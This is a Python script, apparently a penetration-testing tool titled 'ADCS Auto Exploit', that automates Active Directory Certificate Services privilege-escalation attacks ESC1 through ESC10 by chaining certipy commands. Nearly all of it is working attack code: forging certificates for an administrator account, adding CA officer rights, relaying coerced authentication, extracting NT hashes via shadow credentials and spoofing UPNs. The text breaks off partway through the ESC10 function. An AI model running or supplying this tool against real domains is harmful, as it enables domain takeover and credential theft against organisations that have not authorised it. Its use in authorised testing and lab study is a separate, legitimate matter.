#!/usr/bin/env python3

import os
import argparse
import subprocess
from colorama import Fore
from datetime import datetime
import re
import time
import sys

# Color setup
yellow = Fore.YELLOW
green = Fore.GREEN
red = Fore.RED
cyan = Fore.CYAN
blue = Fore.BLUE
reset = Fore.RESET

# Time-based filename suffix
timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

# Argument parsing
parser = argparse.ArgumentParser(description=(f"{red}ADCS Auto Exploit{reset}\n\n"
    "Example:\n\n"
    f"{yellow}adcs_auto_exploit -d lab.local -u blwasp -p 'Password123!' -v administrator -D 10.129.107.232 -t lab-dc.lab.local{reset}"), 
    formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument("-d", "--domainname", required=True, help="Domain Name")
parser.add_argument("-D", "--dcip", required=True, help="DCIP")
parser.add_argument("-u", "--username", required=True, help="Username")
parser.add_argument("-p", "--password", required=True, help="Password")
parser.add_argument("-v", "--victim", default="administrator", help="User to run against if not administrator (administrator is default)")
parser.add_argument("-t", "--target", required=True, help="FQDN of Certificate Authority (DNS name in certificate) (ex CA.NWRT.LOCAL)")
parser.add_argument("-5", "--esc5", action="store_true", help="Run ESC5, usually certipy does not see this one")
parser.add_argument("-10", "--esc10", action="store_true", help="Run ESC10, this cannot be tested for by Certipy Find")
parser.add_argument("-r", "--revert", action="store_true", help="Used after running ESC4, this will revert template back to original template")
parser.add_argument("-j", "--json", help="JSON template used with revert command, only use after exploitation with ESC4")
parser.add_argument("-e", "--templ", help="Template name used with revert command (which template had ESC4 vulnerable)")
parser.add_argument("-pr", "--proxy", action="store_true", help="If going through proxychains (still do a proxychains -q python3 esc.py...)")

args = parser.parse_args()

# Validate that --json is only used with --revert
if args.json and not args.revert:
    parser.error("--json can only be used with --revert")

if args.templ and not args.revert:
    parser.error("--templ can only be used with --revert")

if args.revert:
    if not args.json:
        parser.error("--json is required with --revert")
    if not args.templ:
        parser.error("--templ is required with --revert")

# Extract arguments
username = args.username
password = args.password
domain = args.domainname
ip = args.dcip
victim = args.victim
target = args.target
five = args.esc5
ten = args.esc10
proxy = args.proxy
msg = f"{green}[*] Running: {cyan}"
auth_cmd = f"certipy auth -pfx {victim}.pfx -dc-ip {ip} -domain {domain}"

#Utilized to compile certipy and esc together
#certipy_exe = os.path.join(os.path.dirname(sys.argv[0]), "certipy")

def add_proxy_opts(cmd):
    global proxy, ip
    if proxy:
        if not ip:
            print("[-] Proxy enabled but no DC IP provided!")
            return cmd
        return f"{cmd} -dns-tcp -ns {ip}"
    return cmd

def describe_esc(esc):
    descriptions = {
        "ESC1": f"{red}Enrollee supplies subject and template allows client authentication.{reset}",
        "ESC2": f"{red}Template can be used for any purpose.{reset}",
        "ESC3": f"{red}Template has Certificate Request Agent EKU set.{reset}",
        "ESC4": f"{red}User has enrollment rights and SAN control (e.g., spoof DC).{reset}",
        "ESC5": f"{red}user can modify certificate template access control lists (e.g., Role Based Constrained Delegation RBCD){reset}",
        "ESC6": f"{red}Vulnerable if EDITF_ATTRIBUTESUBJECTALTNAME2 flag is set (patched in May 2022 due to CVE-2022-26923){reset}",
        "ESC7": f"{red}Vulnerable if EDITF_ATTRIBUTESUBJECTALTNAME2 can be modified (need administrator CA rights or ManageCA rights over CA){reset}",
        "ESC8": f"{red}Vulnerable web enrollment endpoint anbd at least one certificate template enabled that allows domain computer enrollment and client authentication{reset}",
        "ESC9": f"{red}Dangerous permissions allow tampering with template ACLs.{reset}",
        "ESC10": f"{red}Abuses StrongCertificateBindingEnforcement or CertificateMappingMethods registry keys and spoofs UPN{reset}",
        "ESC11": f"{red}Abuses IF_ENFORCEENCRYPTICERTREQUEST between client and CA{reset}"
    }
    return descriptions.get(esc, "Unknown vulnerability.")

def parse_find_output(file_path):
    parsed_templates = []
    ca_vulns = []
    ca_name = None
    current_template = None
    current_ca = None
    current_escs = []

    if not file_path or not os.path.exists(file_path):
        print(f"{red}[-] Cannot parse output file: {file_path} {reset}")
        return parsed_templates, ca_vulns, ca_name

    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
        lines = f.readlines()

    for i, line in enumerate(lines):
        line = line.strip()

        # Detect CA name (global)
        if line.startswith("CA Name") and ":" in line:
            ca_name = line.split(":", 1)[1].strip()

        # Detect Certificate Authority (per-template)
        elif line.startswith("Certificate Authorities") and ":" in line:
            current_ca = line.split(":", 1)[1].strip()

        # Detect start of new template block
        elif line.startswith("Template Name") and ":" in line:
            # Save previous template if populated
            if current_template and current_ca and current_escs:
                parsed_templates.append({
                    "template": current_template,
                    "ca": current_ca,
                    "escs": current_escs.copy()
                })
            current_template = line.split(":", 1)[1].strip()
            current_escs = []

        # Match *any* ESCx line anywhere
        elif re.match(r"(ESC\d+)", line):
            matches = re.findall(r"(ESC\d+)", line)
            for esc in matches:
                if current_template:
                    if esc not in current_escs:
                        current_escs.append(esc)
                else:
                    if esc not in ca_vulns:
                        ca_vulns.append(esc)

    # Final flush
    if current_template and current_ca and current_escs:
        parsed_templates.append({
            "template": current_template,
            "ca": current_ca,
            "escs": current_escs.copy()
        })

    # Template-level ESC summary
    if parsed_templates:
        print(f"{green}[+] Parsed Vulnerable Templates:{reset}")
        for idx, entry in enumerate(parsed_templates, 1):
            print(f"  [{idx}] Template: {entry['template']} (CA: {entry['ca']})")
            for esc in entry['escs']:
                print(f"      -> {esc}: {describe_esc(esc)}")
            if idx != len(parsed_templates):
                print()
    else:
        print(f"{yellow}[!] No vulnerable templates parsed.{reset}")

    # CA-level ESC summary
    if ca_vulns:
        print(f"\n{green}[+] Parsed CA-Level ESCs:{reset}")
        for idx, esc in enumerate(ca_vulns, 1):
            print(f"[{idx}] {esc} - {describe_esc(esc)}")
            if idx != len(ca_vulns):
                print()

    return parsed_templates, ca_vulns, ca_name

#def parse_find_output(file_path):
#    parsed_templates = []
#    ca_vulns = []
#    ca_name = None
#    current_template = None
#    current_ca = None
#    current_escs = []
#
#    if not file_path or not os.path.exists(file_path):
#        print(f"{red}[-] Cannot parse output file: {file_path} {reset}")
#        return parsed_templates, ca_vulns, ca_name
#
#    with open(file_path, "r") as f:
#        lines = f.readlines()
#
#    i = 0
#    while i < len(lines):
#        line = lines[i].strip()
#
#        if line.startswith("Template Name") and ":" in line:
#            if current_template and current_ca and current_escs:
#                parsed_templates.append({
#                    "template": current_template,
#                    "ca": current_ca,
#                    "escs": current_escs.copy()
#                })
#            current_template = line.split(":", 1)[1].strip()
#            current_escs = []
#
#        elif line.startswith("Certificate Authorities") and ":" in line:
#            current_ca = line.split(":", 1)[1].strip()
#
#        elif line.startswith("CA Name") and ":" in line:
#            ca_name = line.split(":", 1)[1].strip()
#
#        elif line.startswith("[!] Vulnerabilities") or line.startswith("Vulnerabilities"):
#            j = i + 1
#            while j < len(lines):
#                vuln_line = lines[j].strip()
#                match = re.match(r"^(ESC\d+)", vuln_line)
#                if match:
#                    esc = match.group(1)
#                    if current_template:
#                        if esc not in current_escs:
#                            current_escs.append(esc)
#                    else:
#                        if esc not in ca_vulns:
#                            ca_vulns.append(esc)
#                elif vuln_line == "" or vuln_line.startswith("Template Name"):
#                    break
#                j += 1
#            i = j - 1
#
#        i += 1
#
#    if current_template and current_ca and current_escs:
#        parsed_templates.append({
#            "template": current_template,
#            "ca": current_ca,
#            "escs": current_escs.copy()
#        })
#
#    # Print summary cleanly
#    # Template summary
#    if parsed_templates:
#        print(f"{green}[+] Parsed Vulnerable Templates:{reset}")
#        for idx, entry in enumerate(parsed_templates, 1):
#            print(f"  [{idx}] Template: {entry['template']} (CA: {entry['ca']})")
#            for esc in entry['escs']:
#                print(f"      -> {esc}: {describe_esc(esc)}")
#            if idx != len(parsed_templates):
#                print()  # Blank line between templates, but not after last one
#    else:
#        print(f"{yellow}[!] No vulnerable templates parsed.{reset}")
#    
#    # CA-level ESCs summary
#    if ca_vulns:
#        print(f"\n{green}[+] Parsed CA-Level ESCs:{reset}")
#        for idx, esc in enumerate(ca_vulns, 1):
#            print(f"[{idx}] {esc} - {describe_esc(esc)}")
#            if idx != len(ca_vulns):
#                print()  # Blank line between CA-level ESCs
#
#    return parsed_templates, ca_vulns, ca_name

def choose_template_and_esc(templates):
    if not templates:
        print(f"{red}[-] No templates to choose from.{reset}")
        return None, None

    print(f"\n{green}[+] Parsed Vulnerable Templates:{reset}")
    for idx, entry in enumerate(templates, 1):
        print(f"  [{idx}] Template: {entry['template']} (CA: {entry['ca']})")
        for esc in entry['escs']:
            print(f"      -> {esc}: {describe_esc(esc)}")

    while True:
        choice = input(f"\n{cyan}[?] Enter the number of the template you'd like to exploit (or 'q' to quit): {reset}")
        if choice.lower() == 'q':
            return None, None
        if choice.isdigit() and 1 <= int(choice) <= len(templates):
            selected = templates[int(choice) - 1]
            break
        else:
            print(f"{red}[-] Invalid input. Try again.{reset}")

    if len(selected["escs"]) == 1:
        print(f"{green}[+] Auto-selected {selected['escs'][0]} for template {selected['template']}{reset}")
        return selected, selected["escs"][0]

    print(f"\n{green}[+] {selected['template']} is vulnerable to the following:{reset}")
    for i, esc in enumerate(selected["escs"], 1):
        print(f"  [{i}] {esc} - {describe_esc(esc)}")

    while True:
        esc_choice = input(f"{cyan}[?] Choose which ESC you'd like to exploit: {reset}")
        if esc_choice.isdigit() and 1 <= int(esc_choice) <= len(selected["escs"]):
            chosen_esc = selected["escs"][int(esc_choice) - 1]
            return selected, chosen_esc
        else:
            print(f"{red}[-] Invalid ESC choice. Try again.{reset}")


def revert_esc4(template_name, ca_name, json_file):
    print(f"{green}[+] Reverting {args.json} back to orginial template{reset}")
    print(f"{red}[!] When asked, y to both questions{reset}")
    time.sleep(3)
    cmd = add_proxy_opts(f"certipy template -u {username}@{domain} -p {password} -template {args.templ} -write-configuration {args.json}")
    print(f"{msg} {cyan}{cmd} {reset}")
    subprocess.call(cmd, shell=True)

def run_certipy_find():
    if proxy:
        output_filename = f"certipy_find_{timestamp}.txt"
    
        # First attempt (fast, may fail parsing under proxychains)
        cmd1 = f"certipy find -u {username}@{domain} -p {password} -dc-ip {ip} -dns-tcp -ns {ip} -stdout -enabled -vulnerable | tee {output_filename}"
        print(f"{msg} {cyan}{cmd1} {reset}")
        subprocess.call(cmd1, shell=True)
    
        # Fallback always runs next — deeper but more resilient to partial parsing
        print(f"{yellow}[*] Running again without -enabled and -vulnerable due to proxychains limitations{reset}")
        cmd2 = f"certipy find -u {username}@{domain} -p {password} -dc-ip {ip} -dns-tcp -ns {ip} -stdout | tee {output_filename}"
        subprocess.call(cmd2, shell=True)

        return output_filename
    else:
        output_filename = f"certipy_find_{timestamp}.txt"
        cmd = f"certipy find -u {username}@{domain} -p {password} -dc-ip {ip} -stdout -vulnerable -enabled | tee {output_filename}"
        print(f"{msg} {cyan}{cmd} {reset}")
        subprocess.call(cmd, shell=True)
        return output_filename   

def extract_sid(output):
    for line in output.splitlines():
        if "objectSid" in line and ":" in line:
            return line.split(":", 1)[1].strip()
    return None

def get_sid_from_command(cmd):
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"{red}[-] Command failed: {cmd}{reset}")
        return None
    return extract_sid(result.stdout)

def run_cert_request_auto(ca, template, victim):
    req_cmd = [
        "certipy", "req",
        "-u", f"{username}@{domain}",
        "-p", password,
        "-ca", ca,
        "-template", template,
        "-upn", victim
    ]
    
    print(f"{msg} {' '.join(req_cmd)} {reset}")
    print(f"{red}[!] Attempting certificate request, will auto-save key if prompted{reset}")

    proc = subprocess.Popen(req_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, text=True)
    stdout, _ = proc.communicate(input="y\n")  # Send 'y' if prompted

    request_id = None
    key_file = None

    # Print and parse output
    for line in stdout.splitlines():
        print(line.strip())

        if not request_id:
            match = re.search(r"Request ID is (\d+)", line)
            if match:
                request_id = match.group(1)

        if not key_file:
            match_key = re.search(r"Saving private key to '(.+\.key)'", line)
            if match_key:
                key_file = match_key.group(1)

    # Print summary
    if request_id:
        print(f"{green}[+] Extracted Request ID: {request_id}{reset}")
    else:
        print(f"{yellow}[!] Request ID not found in output{reset}")

    if key_file:
        print(f"{green}[+] Private key saved as: {key_file}{reset}")
    else:
        print(f"{yellow}[!] Private key filename not detected{reset}")

    # Show exit code info
    if proc.returncode != 0:
        print(f"{yellow}[!] Certipy exited with code {proc.returncode} — might indicate failure, but continuing if Request ID found.{reset}")

    return request_id, key_file

def run_esc1(template, ca):
    print(f"{green}[*] Running ESC1 attack using Template: {template}, CA: {ca} {reset}")

    sid_cmd = add_proxy_opts(f"certipy account -u {username}@{domain} -p {password} -dc-ip {ip} -user {victim} read")
    print(f"{msg} Getting victim SID with: {cyan}{sid_cmd} {reset}")

    sid = get_sid_from_command(sid_cmd)
    if sid:
        print(f"{green}[*] Victim SID is: {red}{sid} {reset}")
    else:
        print(f"{red}[-] Failed to extract SID for victim user {victim} {reset}")
        return

    esc1_cmd = add_proxy_opts(f"certipy req -u {username}@{domain} -p {password} -dc-ip {ip} -template {template} -ca {ca} -target {target} -sid {sid} -upn {victim}@{domain}")
    print(f"{msg} ESC1 attack with: {cyan}{esc1_cmd} {reset}")
    subprocess.call(esc1_cmd, shell=True)

    print(f"{msg} Running {cyan}{auth_cmd}{reset}")
    subprocess.call(auth_cmd, shell=True)

def run_esc2(template, ca):
    print(f"{green}[*] Running ESC2 attack using Template: {template}, CA: {ca} {reset}")

    sid_cmd = add_proxy_opts(f"certipy account -u {username}@{domain} -p {password} -dc-ip {ip} -user {victim} read")
    print(f"{msg} Getting victim SID with: {cyan}{sid_cmd} {reset}")
    sid = get_sid_from_command(sid_cmd)

    if sid:
        print(f"{green}[*] Victim SID is: {red}{sid} {reset}")
    else:
        print(f"{red}[-] Failed to extract SID for victim user {victim} {reset}")
        return

    sid_cmd_username = add_proxy_opts(f"certipy account -u {username}@{domain} -p {password} -dc-ip {ip} -user {username} read")
    print(f"{msg} Getting {username} SID with: {cyan}{sid_cmd_username} {reset}")
    sid_user = get_sid_from_command(sid_cmd_username)

    if sid_user:
        print(f"{green}[*] Your SID is: {red}{sid_user} {reset}")
    else:
        print(f"{red}[-] Failed to extract SID for user {username} {reset}")
        return

    esc2_cmd = add_proxy_opts(f"certipy req -u {username}@{domain} -p {password} -dc-ip {ip} -template {template} -ca {ca} -target {target} -sid {sid_user}")
    print(f"{msg} ESC2 attack with: {cyan}{esc2_cmd} {reset}")
    subprocess.call(esc2_cmd, shell=True)

    esc2_pfx_cmd = add_proxy_opts(f"certipy req -u {username}@{domain} -p {password} -dc-ip {ip} -template user -ca {ca} -target {target} -pfx {username}.pfx -on-behalf-of {domain}\\{victim} -sid {sid}")
    print(f"{msg} Running {cyan}{esc2_pfx_cmd}{reset}")
    subprocess.call(esc2_pfx_cmd, shell=True)

def run_esc2_1(template, ca):
    print(f"{green}[*] Running ESC2 attack using Template: {template}, CA: {ca} {reset}")

    sid_cmd = add_proxy_opts(f"certipy account -u {username}@{domain} -p {password} -dc-ip {ip} -user {victim} read")
    print(f"{msg} Getting victim SID with: {cyan}{sid_cmd} {reset}")
    sid = get_sid_from_command(sid_cmd)

    if sid:
        print(f"{green}[*] Victim SID is: {red}{sid} {reset}")
    else:
        print(f"{red}[-] Failed to extract SID for victim user {victim} {reset}")
        return

    sid_cmd_username = add_proxy_opts(f"certipy account -u {username}@{domain} -p {password} -dc-ip {ip} -user {username} read")
    print(f"{msg} Getting {username} SID with: {cyan}{sid_cmd_username} {reset}")
    sid_user = get_sid_from_command(sid_cmd_username)

    if sid_user:
        print(f"{green}[*] Your SID is: {red}{sid_user} {reset}")
    else:
        print(f"{red}[-] Failed to extract SID for user {username} {reset}")
        return

    esc2_cmd = add_proxy_opts(f"certipy req -u {username}@{domain} -p {password} -dc-ip {ip} -template {template} -ca {ca} -target {target} -sid {sid} -upn {victim} -domain {domain}")
    print(f"{msg} ESC2 attack with: {cyan}{esc2_cmd} {reset}")
    subprocess.call(esc2_cmd, shell=True)

    print(f"{msg} Running {cyan}{auth_cmd}{reset}")
    subprocess.call(auth_cmd, shell=True)

def run_esc3(template, ca):
    print(f"{green}[*] Running ESC3 attack using Template: {template}, CA: {ca} {reset}")

    sid_cmd = add_proxy_opts(f"certipy account -u {username}@{domain} -p {password} -dc-ip {ip} -user {victim} read")
    print(f"{msg} Getting victim SID with: {cyan}{sid_cmd} {reset}")
    sid = get_sid_from_command(sid_cmd)

    if sid:
        print(f"{green}[*] Victim SID is: {red}{sid} {reset}")
    else:
        print(f"{red}[-] Failed to extract SID for victim user {victim} {reset}")
        return

    sid_cmd_username = add_proxy_opts(f"certipy account -u {username}@{domain} -p {password} -dc-ip {ip} -user {username} read")
    print(f"{msg} Getting {username} SID with: {cyan}{sid_cmd_username} {reset}")
    sid_user = get_sid_from_command(sid_cmd_username)

    if sid_user:
        print(f"{green}[*] Your SID is: {red}{sid_user} {reset}")
    else:
        print(f"{red}[-] Failed to extract SID for user {username} {reset}")
        return

    esc3_cmd = add_proxy_opts(f"certipy req -u {username}@{domain} -p {password} -dc-ip {ip} -template {template} -ca {ca} -target {target}")
    print(f"{msg} ESC3 attack with: {cyan}{esc3_cmd} {reset}")
    subprocess.call(esc3_cmd, shell=True)

    esc3_cmd = add_proxy_opts(f"certipy req -u {username}@{domain} -p {password} -dc-ip {ip} -template user -pfx {username}.pfx -on-behalf-of {domain}\\{victim} -ca {ca} -target {target}")
    print(f"{msg} ESC3 attack with domain account: {cyan}{esc3_cmd} {reset}")
    subprocess.call(esc3_cmd, shell=True)

    print(f"{msg} Running {cyan}{auth_cmd}{reset}")
    subprocess.call(auth_cmd, shell=True)

    esc3_cmd = add_proxy_opts(f"certipy req -u {username}@{domain} -p {password} -dc-ip {ip} -template user -pfx {username}.pfx -on-behalf-of {victim} -ca {ca} -target {target}")
    print(f"{msg} ESC3 attack with local account: {cyan}{esc3_cmd} {reset}")
    subprocess.call(esc3_cmd, shell=True)

    print(f"{msg} Running {cyan}{auth_cmd}{reset}")
    subprocess.call(auth_cmd, shell=True)

def run_esc4(template,ca):
    tmp_cmd = add_proxy_opts(f"certipy template -u {username}@{domain} -p {password} -template {template} -dc-ip {ip} -write-default-configuration")
    print(f"{msg} ESC4 attack with: {cyan}{tmp_cmd} {reset}")
    print(f"{red}[!] When certipy asks y/n answer should be y{reset}")
    time.sleep(3)
    subprocess.call(tmp_cmd, shell=True)
    print(f"{red}[!] {template} should now be vulnerable to ESC1{reset}")
    print(f"{red}[!] Run esc.py again and pick and noticed the {template} is vulnerable to ESC1{reset}")
    print(f"{red}[!] To revert to orginial template (needed for cleanup!) run revert with json file that is now within your directory{reset}")

    #sid_cmd = add_proxy_opts(f"certipy account -u {username}@{domain} -p {password} -dc-ip {ip} -user {victim} read")
    #print(f"{msg} Getting victim SID with: {cyan}{sid_cmd} {reset}")
#
    #sid = get_sid_from_command(sid_cmd)
    #if sid:
    #    print(f"{green}[*] Victim SID is: {red}{sid} {reset}")
    #else:
    #    print(f"{red}[-] Failed to extract SID for victim user {victim} {reset}")
    #    return
#
    #req_cmd = add_proxy_opts(f"certipy req -u {username}@{domain} -p {password} -dc-ip {ip} -template {template} -upn {victim} -ca {ca} -sid {sid}")
    #print(f"{msg} ESC4 attack with: {cyan}{req_cmd} {reset}")
    #subprocess.call(req_cmd, shell=True)
#
    #auth_cmd1 = add_proxy_opts(f"certipy auth -pfx {victim}.pfx -username {victim} -domain {domain}")
    #print(f"{msg}{cyan}{auth_cmd1}{reset}")
    #subprocess.call(auth_cmd1, shell=True)
#
    #tmp_cmd = add_proxy_opts(f"certipy template -u {username}@{domain} -p {password} -template {template} -write-configuration {template}.json -dc-ip {ip} -no-save")
    #print(f"{red}When certipy asks y/n answer should be y{reset}")
    #subprocess.call(tmp_cmd, shell=True)
    #print(f"{msg}Reset {template} to how we found it{reset}")

def run_esc5(template, ca):
    proxy_opts = f"-ns {ip} -dns-tcp" if proxy else ""
    target_ip = input(f"{cyan}[?] Target IP (ADCS Server): {reset}")

    # Get victim SID
    sid_cmd = add_proxy_opts(f"certipy account -u {username}@{domain} -p {password} -dc-ip {ip} -user {victim} {proxy_opts} read")
    print(f"{msg} Getting victim SID with: {cyan}{sid_cmd}{reset}")
    sid = get_sid_from_command(sid_cmd)

    if not sid:
        print(f"{red}[-] Failed to extract SID for victim user {victim}{reset}")
        return
    print(f"{green}[*] Victim SID is: {red}{sid}{reset}")

    # Get your SID
    sid_cmd_username = add_proxy_opts(f"certipy account -u {username}@{domain} -p {password} -dc-ip {ip} -user {username} read")
    print(f"{msg} Getting {username} SID with: {cyan}{sid_cmd_username}{reset}")
    sid_user = get_sid_from_command(sid_cmd_username)

    if not sid_user:
        print(f"{red}[-] Failed to extract SID for user {username}{reset}")
        return
    print(f"{green}[*] Your SID is: {red}{sid_user}{reset}")

    # Perform the initial request with full opts
    base_req_cmd = (
        f"certipy req -u {username}@{domain} -p {password} "
        f"-target-ip {target_ip} -ca {ca} -dc-ip {ip} -template {template} "
        f"-upn {victim}@{domain} -sid {sid}"
    )
    req_cmd = add_proxy_opts(base_req_cmd)
    print(f"{msg}{req_cmd}{reset}")
    
    proc = subprocess.Popen(req_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, text=True)
    stdout, _ = proc.communicate(input="y\n")

    request_id = None
    key_file = None

    for line in stdout.splitlines():
        print(line.strip())
        match = re.search(r"Request ID is (\d+)", line)
        if match:
            request_id = match.group(1)
        match_key = re.search(r"Saving private key to '(.+\.key)'", line)
        if match_key:
            key_file = match_key.group(1)

    if request_id:
        print(f"{green}[+] Extracted Request ID: {request_id}{reset}")
        # Issue the request
        base_ca_cmd2 = (
            f"certipy ca -u {username}@{domain} -p {password} "
            f"-target-ip {target_ip} -ca {ca} -dc-ip {ip} "
            f"-issue-request {request_id}"
        )
        ca_cmd2 = add_proxy_opts(base_ca_cmd2)
        print(f"{msg}{ca_cmd2}{reset}")
        subprocess.call(ca_cmd2, shell=True)

        # Retrieve certificate
        base_req_retrieve = (
        f"certipy req -u {username}@{domain} -p {password} -ca {ca} "
        f"-target-ip {target_ip} -retrieve {request_id} -dc-ip {ip}"
        )
        req_retrieve = add_proxy_opts(base_req_retrieve)
        print(f"{msg}{req_retrieve}{reset}")
        subprocess.call(req_retrieve, shell=True)
    else:
        print(f"{red}[-] Cannot issue or retrieve without request ID!{reset}")

    # Attempt auth
    a_cmd = add_proxy_opts(f"certipy auth -pfx {victim}.pfx -domain {domain} -dc-ip {ip}")
    print(f"{msg}: {cyan}{a_cmd}{reset}")
    subprocess.call(a_cmd, shell=True)

def run_esc6(ca):
    req_cmd = add_proxy_opts(f"certipy req -u {username}@{domain} -p {password} -ca {ca} -template user -upn {victim}@{domain}")
    print(f"{msg}{req_cmd}{reset}")
    subprocess.call(req_cmd, shell=True)
    a_cmd = add_proxy_opts(f"certipy auth -pfx {victim}.pfx -domain {domain} -dc-ip {ip}")
    print(f"{msg}: {cyan}{a_cmd} {reset}")
    subprocess.call(a_cmd, shell=True)

def run_esc7(ca):
    # Enable SubCA template first
    ca_cmd = add_proxy_opts(f"certipy ca -u {username}@{domain} -p {password} -ca {ca} -target {target} -enable-template 'SubCA'")
    print(f"{msg}{ca_cmd}{reset}")
    print(f"{cyan}[+] Enabling SubCA template{reset}")
    subprocess.call(ca_cmd, shell=True)

    # Add officer rights
    ca1_cmd = add_proxy_opts(f"certipy ca -u {username}@{domain} -p {password} -ca {ca} -target {target} -add-officer {username}")
    print(f"{msg}{ca1_cmd}{reset}")
    print(f"{cyan}[+] Adding {username} as officer to {ca}{reset}")
    subprocess.call(ca1_cmd, shell=True)

    # Get victim SID
    sid_cmd = add_proxy_opts(f"certipy account -u {username}@{domain} -p {password} -dc-ip {ip} -user {victim} read")
    print(f"{msg} Getting victim SID with: {cyan}{sid_cmd} {reset}")
    sid = get_sid_from_command(sid_cmd)

    if sid:
        print(f"{green}[*] Victim SID is: {red}{sid} {reset}")
    else:
        print(f"{red}[-] Failed to extract SID for victim user {victim} {reset}")
        return

    sid_cmd_username = add_proxy_opts(f"certipy account -u {username}@{domain} -p {password} -dc-ip {ip} -user {username} read")
    print(f"{msg} Getting {username} SID with: {cyan}{sid_cmd_username} {reset}")
    sid_user = get_sid_from_command(sid_cmd_username)

    if sid_user:
        print(f"{green}[*] Your SID is: {red}{sid_user} {reset}")
    else:
        print(f"{red}[-] Failed to extract SID for user {username} {reset}")
        return

    ca1_req = add_proxy_opts(f"certipy req -u {username}@{domain} -p {password} -ca {ca} -dc-ip {ip} -template 'SubCA' -upn {victim}@{domain} -sid {sid}")
    print(f"{msg}{ca1_req}{reset}")
    subprocess.call(ca1_req, shell=True)

    # Request cert, auto handle private key + parse Request ID
    request_id, key_file = run_cert_request_auto(ca, "SubCA", victim)

    if request_id:
        # Issue request
        ca_cmd2 = add_proxy_opts(f"certipy ca -u {username}@{domain} -p {password} -ca {ca} -dc-ip {ip} -target {target} -issue-request {request_id}")
        print(f"{msg}{ca_cmd2}{reset}")
        subprocess.call(ca_cmd2, shell=True)

        # Retrieve issued certificate
        req_retrieve = add_proxy_opts(f"certipy req -u {username}@{domain} -p {password} -ca {ca} -target {target} -retrieve {request_id} -dc-ip {ip}")
        print(f"{msg}{req_retrieve}{reset}")
        subprocess.call(req_retrieve, shell=True)
    else:
        print(f"{red}[-] Cannot issue or retrieve without request ID!{reset}")

    a_cmd = add_proxy_opts(f"certipy auth -pfx {victim}.pfx -domain {domain} -dc-ip {ip}")
    print(f"{msg}: {cyan}{a_cmd} {reset}")
    subprocess.call(a_cmd, shell=True)

def run_esc8(ca):
    print(f"{red}[!] Running certipy as sudo -E user due to relay listening{reset}")
    target_ip = input(f"{cyan}[?] ADCS Endpoint IP (target that has http://xxx.xxx.xxx.xxx/certsrv/certnsh.asp): {reset}")
    
    print(f"""{red}[!] You need to do the following in another shell:
        nxc smb <machine to coerce> -M coerce_plus -o LISTENER=<lhost> -o ALWAYS=True -o METHOD=<one of the following PetitPotam, DFSCoerce...""")
    
    relay_cmd = f"sudo -E certipy relay -target {target_ip} -template DomainController"
    print(f"{msg}{relay_cmd}{reset}")

    proc = subprocess.Popen(relay_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    pfx_file = None

    for line in proc.stdout:
        print(line.strip())
        match = re.search(r"Saved certificate and private key to '(.+\.pfx)'", line)
        if match:
            pfx_file = match.group(1)
    
    proc.wait()

    if pfx_file:
        print(f"{green}[+] Detected saved PFX file: {pfx_file}{reset}")
        auth_cmd = add_proxy_opts(f"certipy auth -pfx {pfx_file}")
        print(f"{msg}{auth_cmd}{reset}")
        subprocess.call(auth_cmd, shell=True)
    else:
        print(f"{red}[-] Could not detect saved PFX file in certipy relay output. Please check manually.{reset}")

def run_esc9(template, ca):
    q = input(f"{cyan}[?] ESC9 requires DACLEDIT from shutdownrepo. The newest Kali does come with it, but older versions does not and needs to be installed, contine (y/n):{reset} ")
    if q != "y":
        print(f"{red}Exiting")
        quit()

    print(f"{green}[!] Verifying {red}{username}{green} has full control over {red}{victim}{green}, this is needed for ESC9, read output, if {username} does not have full control ESC9 will not work{reset}")
    dacl_cmd = f"dacledit.py -action read -dc-ip {ip} {domain}/{username}:{password} -principal {username} -target {victim}"
    print(f"{msg} DACLedit with: {cyan}{dacl_cmd} {reset}")
    subprocess.call(dacl_cmd, shell=True)

    sha_cmd = add_proxy_opts(f"certipy shadow auto -u '{username}@{domain}' -p '{password}' -account {victim}")
    print(f"{msg} {cyan}{sha_cmd} {reset}")
    proc = subprocess.Popen(sha_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    nt_hash = None
    for line in proc.stdout:
        print(line.strip())
        m = re.search(r"NT hash for '.*?': ([0-9a-fA-F]{32})", line)
        if m:
            nt_hash = m.group(1)
    proc.wait()

    if nt_hash:
        print(f"{green}[+] Extracted NT hash: {red}{nt_hash}{reset}")
    else:
        print(f"{red}[-] Failed to extract NT hash{reset}")
        return None

    # Continue using nt_hash here
    victim2 = input(f"{cyan}[?] Which user would you like to exploit (ex: administrator): {reset}")

    up_cmd = add_proxy_opts(f"certipy account update -u {username}@{domain} -p {password} -user {victim} -upn {victim2}@{domain}")
    print(f"{msg}: {cyan}{up_cmd} {reset}")
    subprocess.call(up_cmd, shell=True)
    print(f"{green}[+] We have updated {red}{victim}{green} UPN to be {red}{victim2}{green} UPN, this will be cleaned up at the end{reset}")

    req_cmd = add_proxy_opts(f"certipy req -u {victim}@{domain} -hashes {nt_hash} -ca {ca} -template {template}")
    print(f"{msg}: {cyan}{req_cmd} {reset}")
    subprocess.call(req_cmd, shell=True)

    rev_cmd = add_proxy_opts(f"certipy account update -u {username}@{domain} -p {password} -user {victim} -upn {victim}@{domain}")
    print(f"{msg}: {cyan}{rev_cmd} {reset}")
    subprocess.call(rev_cmd, shell=True)
    print(f"{green}[+] Account permissions normal again for {red}{victim}{green} and {red}{victim2}{reset}")

    a_cmd = add_proxy_opts(f"certipy auth -pfx {victim2}.pfx -domain {domain} -dc-ip {ip}")
    print(f"{msg}: {cyan}{a_cmd} {reset}")
    subprocess.call(a_cmd, shell=True)

    return nt_hash

def run_esc10():
    print(f"{green}[+] For this to work The StrongCertificateBindingEnforcement registry key needs to be set to {red}0{green}. However, as a normal user we cannot look at the registry key. This means we would just have to try the exploit{reset}")
    print(f"{green}[+] We also need full control over {red}{victim}{green} with {username}")
    sha_cmd = add_proxy_opts(f"certipy shadow auto -u {username}@{domain} -p {password} -account {victim}")
    print(f"{msg}: {cyan}{sha_cmd} {reset}")
    proc = subprocess.Popen(sha_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    nt_hash = None
    for line in proc.stdout:
        print(line.strip())
